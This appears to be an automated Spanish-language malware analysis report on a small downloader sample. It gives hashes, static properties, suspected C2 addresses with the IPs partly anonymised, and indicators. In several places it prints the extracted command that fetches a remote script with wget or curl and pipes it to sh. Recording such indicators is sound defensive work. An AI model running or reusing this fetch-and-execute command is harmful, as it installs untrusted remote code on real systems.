# 🧬 Payload Analysis

`0ec6d87b4334e560ed91faa14d927d78faaf9417e381a641c3fbf7213f5d94ff`

## 📌 Resumen

Texto ASCII de 799 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `sh` en `hxxps://217.60.195.XXX/sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**

1. `wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh`
2. `curl -sk hxxps://217.60.195.XXX/sh)`
3. `sh -s apache.selfre` **C2 / infraestructura de control:**

- **Posible C2:** `217.60.195.XXX` — confianza Alto, evidencia hardcoded_in_payload
- **Posible C2:** `190.179.140.XXX` — confianza Alto, evidencia hardcoded_in_payload Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/0ec6d87b4334e560ed91faa14d927d78faaf9417e381a641c3fbf7213f5d94ff.md](../../../../../malware-like/oraculo/downloader/0ec6d87b4334e560ed91faa14d927d78faaf9417e381a641c3fbf7213f5d94ff.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:05:52.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `0ec6d87b4334e560ed91faa14d927d78faaf9417e381a641c3fbf7213f5d94ff`
- **SHA1:** `3345d0197d1cc97be1bf0b023753f84124333150`
- **MD5:** `ce715a5ecde049c3bb4acb4276e0807c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 799 B |
| Entropía | 5.19 |
| Strings | 17 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
(wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh || curl -sk hxxps://217.60.195.XXX/sh) | sh -s apache.selfre
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://217.60.195.XXX/sh | strings |
| url | hxxps://217.60.195.XXX/sh) | strings |
| ip | 190.179.140.XXX | static_analysis |
| ip | 217.60.195.XXX | static_analysis |
| command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
| hash | 0ec6d87b4334e560ed91faa14d927d78faaf9417e381a641c3fbf7213f5d94ff | static_analysis |
| ip | 118.70.178.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
